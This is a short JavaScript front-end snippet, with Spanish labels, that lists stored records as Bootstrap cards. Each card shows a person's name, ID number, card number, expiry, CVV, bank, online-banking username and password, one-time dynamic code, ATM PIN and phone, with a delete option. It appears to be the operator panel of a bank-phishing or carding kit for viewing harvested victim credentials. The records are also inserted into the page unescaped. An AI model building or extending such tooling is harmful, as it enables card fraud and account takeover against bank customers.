const cardButton = document.getElementById('card-button');

cardButton.addEventListener('click', (link) => {
  link.preventDefault();

  titleContent.innerHTML = "Tarjetas";
  divDataTables.innerHTML = "";

  data.forEach((object) => {

      const panel = document.createElement("div");
      panel.className = "card mb-3";

      let options = {
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      };

      date = new Date(object.horacreado).toLocaleDateString("es-ES", options);
      setDate = new Date(object.horamodificado).toLocaleDateString(
        "es-ES",
        options
      );

      panel.innerHTML = `<div class="divcard">
            <div class="dropdown mt-3 mb-2 mx-3">
                    <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                        Acciones
                    </button>
                    <ul class="dropdown-menu" data-id="${object.idreg}">
                      <li><a class="dropdown-item active bg-danger" href="" data-estado="eliminar" onclick="deleteData(this.closest('.dropdown-menu').getAttribute('data-id'));  location.reload();">Eliminar</a></li>
                    </ul>
                </div>
                <table class="table table-striped table-bordered table-sm">
  <thead>
    <tr>
      <th scope="col">Fuente</th>
      <th scope="col">Nombre</th>
      <th scope="col">CC</th>
      <th scope="col">TC</th>
      <th scope="col">EXP</th>
      <th scope="col">CVV</th>
      <th scope="col">Banco</th>
      <th scope="col">Usuario</th>
      <th scope="col">Contraseña</th>
      <th scope="col">Dinámica</th>
      <th scope="col">Cajero</th>
      <th scope="col">Teléfono</th>
      <th scope="col">Estado</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">Tarjetas</th>
      <td>${object.nombre}</td>
      <td>${object.id}</td>
      <td>${object.tarjeta}</td>
      <td>${object.ftarjeta}</td>
      <td>${object.cvv}</td>
      <td>${object.banco}</td>
      <td>${object.usuario}</td>
      <td>${object.password}</td>
      <td>${object.otp}</td>
      <td>${object.ccajero}</td>
      <td>${object.celular}</td>
      <td>${object.status}</td>
    </tr>
  </tbody>
</table>
</div>
            `;

      divDataTables.appendChild(panel);

  })

});